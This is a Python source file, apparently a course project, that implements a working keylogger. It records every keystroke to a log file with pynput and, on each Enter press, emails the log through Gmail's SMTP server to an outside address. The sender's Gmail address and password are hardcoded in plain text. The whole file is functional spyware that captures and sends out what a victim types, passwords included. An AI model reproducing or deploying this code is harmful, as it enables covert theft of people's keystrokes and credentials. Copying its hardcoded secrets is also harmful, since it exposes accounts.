from pynput.keyboard import Key, Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

keys = []

#Each keyboard storke is appeneded to the log.txt file
def on_each_key_press(key):
    keys.append(key)
    write_keys_to_file(keys)

#create and open log.txt file as w
def write_keys_to_file(keys):
    with open('log.txt', 'w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            logfile.write(key)
            
#send email
def send_email():
	#sender email credentials
	sender_email = "CMSC414Project@gmail.com"
	sender_password = "CMSC414Project!!"

	#destination email address
	destination_email= "jying6566@gmail.com"

	#file to be sent
	file_name = "log.txt"
	subject = '414CMSC keylogger'
	message = 'From 414CMSC keylogger'

	msg = MIMEMultipart()
	msg['From'] = sender_email
	msg['To'] = destination_email
	msg['Subject'] = subject
	msg.attach(MIMEText(message, 'plain'))

	#set up attachment
	attachment = open(file_name, "rb")
	part = MIMEBase('application', 'octet-stream')
	part.set_payload(attachment.read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition', "attachment; filename= %s" % file_name)

	# Attach the attachment to the MIMEMultipart object
	msg.attach(part)

	#set msg as a string
	text = msg.as_string()

	#set up stmp server
	server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	server.login(sender_email, sender_password)
	server.sendmail(
	  sender_email, 
	  destination_email, 
	  text)
	server.quit()

#Press ESC to stop logging, EVERYTIME USER PRESSES ENTER, EMAIL IS SENT WITH LOG
def on_each_key_release(key):
    if key == Key.enter:
        send_email()
    if key == Key.esc:
        return False
        

#Listener for the keyboard
with Listener(
    on_press = on_each_key_press,
    on_release = on_each_key_release
    ) as listener:
    listener.join()
